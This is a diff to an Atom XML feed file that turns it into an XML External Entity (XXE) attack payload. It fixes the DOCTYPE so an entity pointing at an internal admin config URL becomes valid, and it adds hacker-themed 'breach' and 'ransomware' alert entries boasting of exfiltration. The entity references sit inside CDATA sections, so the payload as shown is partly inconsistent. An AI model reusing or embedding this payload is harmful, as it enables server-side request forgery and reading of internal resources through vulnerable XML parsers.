@@ -1,15 +1,48 @@
 <?xml version="1.0" encoding="utf-8"?>
-<! DOCTYPE feed [
+<!DOCTYPE feed [
   <!ENTITY xxe SYSTEM "http://internal-admin-access/config.aspx">
 ]>
 <feed xmlns="http://www.w3.org/2005/Atom">
-  <title>AdverXarial // An obvious non-APT teams</title>
-  <link href="http://gotham.local" rel="alternate"/>
+  <title>AdverXarial</title>
+  <subtitle>Unauthorized Access in Progress...</subtitle>
+  <link href="http://adverxarial.executable" rel="alternate"/>
+  <updated>2024-01-01T00:00:00Z</updated>
+  <id>urn:uuid:deadbeef-0000-4444-0000-4dv3rX4r14l</id>
+  
   <entry>
-    <title>Internal Network Recon</title>
-    <content type="html">
-      Accessing:  &xxe;
-    </content>
+    <title>[BREACH]</title>
+    <id>urn:uuid:payload-xxe-001</id>
+    <content type="html"><![CDATA[
+
+[*] STATUS: Payload Deployed
+[*] TARGET: internal-admin-access/config.aspx
+[*] METHOD: XML External Entity Injection
+[!] ACCESSING: &xxe;
+
+100% COMPLETE
+
+>>> Connection established...
+>>> Exfiltrating sensitive data...
+>>> Mission accomplished.
+    ]]></content>
+    <author>
+      <name>Head Adversary Operator</name>
+      <email>byt3n33dl3@pm.me</email>
+    </author>
     <published>2024-01-01T00:00:00Z</published>
+    <updated>2024-01-01T00:13:37Z</updated>
+  </entry>
+  
+  <entry>
+    <title>[ALERT] Ransomware</title>
+    <id>urn:uuid:alert-002</id>
+    <content type="html"><![CDATA[
+[*] SECURITY BREACH NOTIFICATION
+[*] Time: 00:13:37 UTC
+[*] Vector: XXE Injection
+[!] Status: Pwned!!
+[!] Your incident response team is... probably sleeping.
+    ]]></content>
+    <published>2024-01-01T00:13:37Z</published>
   </entry>
 </feed>
